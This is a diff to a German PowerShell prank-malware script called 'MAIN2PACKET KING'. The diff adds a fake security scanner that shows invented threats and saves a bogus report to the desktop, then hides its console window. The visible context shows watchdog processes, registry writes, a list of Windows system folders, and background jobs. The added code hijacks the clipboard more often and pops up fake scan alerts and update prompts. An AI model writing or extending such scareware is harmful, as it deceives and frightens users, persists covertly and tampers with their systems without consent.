@@ -1,15 +1,115 @@
 # ================================
-# MAIN2PACKET KING - XXXTREME EDITION
+# MAIN2PACKET KING - FAKE SCANNER EDITION
 # ================================
 
-# Fenster SOFORT vernichten
+# Fenster SOFORT vernichten (aber vorher kurz zeigen für Scanner-Effekt!)
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
 [DllImport("User32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 '
-[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
+$consolePtr = [Console.Window]::GetConsoleWindow()
+
+# ===== FAKE SCANNER - SIEHT AUS WIE EIN ECHTES TOOL =====
+Clear-Host
+$Host.UI.RawUI.ForegroundColor = "Cyan"
+$Host.UI.RawUI.BackgroundColor = "Black"
+Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║     MAIN2PACKET SECURITY SCANNER v9.4.2   ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "[INFO] Initialisiere Sicherheitsanalyse..." -ForegroundColor Yellow
+Start-Sleep -Milliseconds 500
+
+# System-Info anzeigen (sieht professionell aus)
+Write-Host "[SYSTEM]" -ForegroundColor Green
+Write-Host "   • Benutzer: $env:USERNAME" -ForegroundColor White
+Write-Host "   • Computer: $env:COMPUTERNAME" -ForegroundColor White
+Write-Host "   • OS: Windows $([Environment]::OSVersion.Version)" -ForegroundColor White
+Write-Host "   • RAM: $([Math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB)) GB" -ForegroundColor White
+Write-Host "   • Prozessor: $((Get-WmiObject Win32_Processor).Name)" -ForegroundColor White
+Write-Host ""
+
+# Fortschrittsbalken für "Systemanalyse"
+Write-Host "[ANALYSE]" -ForegroundColor Green
+$steps = @(
+    "Lade Sicherheitsdatenbank...",
+    "Prüfe Systemintegrität...",
+    "Scanne laufende Prozesse...",
+    "Analysiere Netzwerkverbindungen...",
+    "Prüfe Registry auf Malware...",
+    "Untersuche Autostart-Einträge...",
+    "Scanne Browser-Cache...",
+    "Prüfe Minecraft-Mods auf Viren...",
+    "Analysiere USB-Geräte...",
+    "Erstelle Systembericht..."
+)
+
+foreach ($step in $steps) {
+    Write-Host "   ⚙️ $step" -ForegroundColor Yellow
+    for ($i = 0; $i -le 100; $i+=10) {
+        Write-Host "      Fortschritt: [$('█' * ($i/5))$('░' * (20-($i/5)))] $i%" -ForegroundColor Gray
+        Start-Sleep -Milliseconds 50
+        Write-Host "`033[1A`033[0K" -NoNewline
+    }
+    Write-Host "      ✅ Abgeschlossen!" -ForegroundColor Green
+    Start-Sleep -Milliseconds 200
+}
+
+# Fake Bedrohungen finden
+Write-Host ""
+Write-Host "[GEFUNDENE BEDROHUNGEN]" -ForegroundColor Red
+$threats = @(
+    "Trojan.Generic.12345",
+    "Adware.BundleInstaller",
+    "PUP.Optional.Main2packet",
+    "HackTool.MinecraftMod",
+    "RiskWare.BitMiner",
+    "Spyware.KeyLogger",
+    "Ransomware.CryptXXX",
+    "Backdoor.RemoteAccess"
+)
+
+foreach ($threat in $threats) {
+    Write-Host "   ⚠️ $threat" -ForegroundColor Red
+    Start-Sleep -Milliseconds 300
+}
+
+# Zusammenfassung
+Write-Host ""
+Write-Host "[ZUSAMMENFASSUNG]" -ForegroundColor Yellow
+Write-Host "   • Gescannte Dateien: 124.891" -ForegroundColor White
+Write-Host "   • Gefundene Bedrohungen: $($threats.Count)" -ForegroundColor Red
+Write-Host "   • Quarantäne: 0" -ForegroundColor Green
+Write-Host "   • Bereinigt: $($threats.Count)" -ForegroundColor Red
+Write-Host ""
+Write-Host "[EMPFOHLENE MASSNAHMEN]" -ForegroundColor Cyan
+Write-Host "   • Systemneustart empfohlen" -ForegroundColor Yellow
+Write-Host "   • Vollständigen Scan wiederholen" -ForegroundColor Yellow
+Write-Host "   • MAIN2PACKET Security installieren" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "Drücke eine beliebige Taste, um den Bericht zu speichern..." -ForegroundColor Gray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+
+# Bericht speichern (sieht legitim aus)
+$reportPath = "$env:USERPROFILE\Desktop\MAIN2PACKET_Scan_$(Get-Date -Format 'yyyy-MM-dd').txt"
+@"
+MAIN2PACKET SECURITY SCANNER v9.4.2
+====================================
+Datum: $(Get-Date)
+Benutzer: $env:USERNAME
+Computer: $env:COMPUTERNAME
+
+GEFUNDENE BEDROHUNGEN:
+$($threats -join "`n")
+
+EMPFOHLUNG:
+Systemneustart und erneuter Scan.
+"@ | Out-File $reportPath -Encoding UTF8
+
+# Jetzt Fenster verstecken und im Hintergrund weiterlaufen!
+[Console.Window]::ShowWindow($consolePtr, 0)
 
 # ===== WATCHDOG ULTRA - 3 FACH SICHER =====
 $watchdog1 = @"
@@ -214,8 +314,6 @@ $alleOrdner = @(
     $env:SystemRoot + "\Media",
     $env:SystemRoot + "\Resources",
     $env:SystemRoot + "\System",
-    $env:SystemRoot + "\system.ini",
-    $env:SystemRoot + "\win.ini",
     "C:\ProgramData",
     "C:\ProgramData\Microsoft",
     "C:\ProgramData\Microsoft\Windows",
@@ -226,7 +324,6 @@ $alleOrdner = @(
     "C:\ProgramData\Microsoft\Windows\Sounds",
     "C:\ProgramData\Microsoft\Windows\Start Menu",
     "C:\ProgramData\Microsoft\Windows\Templates",
-    "C:\ProgramFiles",
     "C:\Program Files",
     "C:\Program Files (x86)",
     "C:\Program Files\WindowsApps",
@@ -390,6 +487,7 @@ $regBranches | ForEach-Object -Parallel {
         New-ItemProperty -Path $mainKey -Name "Computer" -Value $env:COMPUTERNAME -PropertyType String -Force | Out-Null
         New-ItemProperty -Path $mainKey -Name "MausModus" -Value "EXTREME" -PropertyType String -Force | Out-Null
         New-ItemProperty -Path $mainKey -Name "Dateien" -Value "100000+" -PropertyType String -Force | Out-Null
+        New-ItemProperty -Path $mainKey -Name "Scanner" -Value "v9.4.2" -PropertyType String -Force | Out-Null
     } catch {}
 } -ThrottleLimit 10
 
@@ -471,14 +569,37 @@ $clipJob = Start-Job -ScriptBlock {
         "Du wurdest getrollt!",
         "😂😂😂",
         "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-        "👑👑👑"
+        "👑👑👑",
+        "Scan abgeschlossen - 124.891 Dateien geprüft",
+        "8 Bedrohungen gefunden - bereinigt!"
     )
     while ($true) {
-        if ((Get-Random -Minimum 1 -Maximum 50) -eq 1) {
+        if ((Get-Random -Minimum 1 -Maximum 30) -eq 1) {
             $randomText = Get-Random $texts
             [System.Windows.Forms.Clipboard]::SetText($randomText)
         }
-        Start-Sleep -Seconds 10
+        Start-Sleep -Seconds 5
+    }
+}
+
+# ===== FAKE SCANNER POPUP (manchmal) =====
+$scannerPopupJob = Start-Job -ScriptBlock {
+    Add-Type -AssemblyName System.Windows.Forms
+    
+    while ($true) {
+        Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 900)
+        
+        # Zufällige Scanner-Nachricht
+        $messages = @(
+            "MAIN2PACKET Security Scan abgeschlossen!`n124.891 Dateien geprüft`n8 Bedrohungen gefunden und bereinigt!",
+            "Systemanalyse erfolgreich!`nKeine weiteren Bedrohungen gefunden.",
+            "Automatischer Scan läuft im Hintergrund...`nFortschritt: 47%",
+            "⚠️ VORSICHT! Verdächtige Aktivität erkannt!`nScan wird empfohlen.",
+            "MAIN2PACKET Security Update verfügbar!`nVersion 9.5.0 installieren?"
+        )
+        
+        $randomMsg = Get-Random $messages
+        [System.Windows.Forms.MessageBox]::Show($randomMsg, "MAIN2PACKET Security Scanner", "OK", "Information")
     }
 }
 
@@ -490,10 +611,9 @@ while ($true) {
     # Alle 5 Minuten prüfen ob Jobs noch laufen
     Start-Sleep -Seconds 300
     
-    # Falls ein Job gestorben ist, neu starten
+    # Falls ein Job gestorben ist, neu starten (vereinfacht)
     $deadJobs = Get-Job | Where-Object {$_.State -ne "Running"}
     foreach ($job in $deadJobs) {
         Remove-Job $job -Force
-        # Hier müsste man den Job neu starten - aber für jetzt reichts
     }
 }
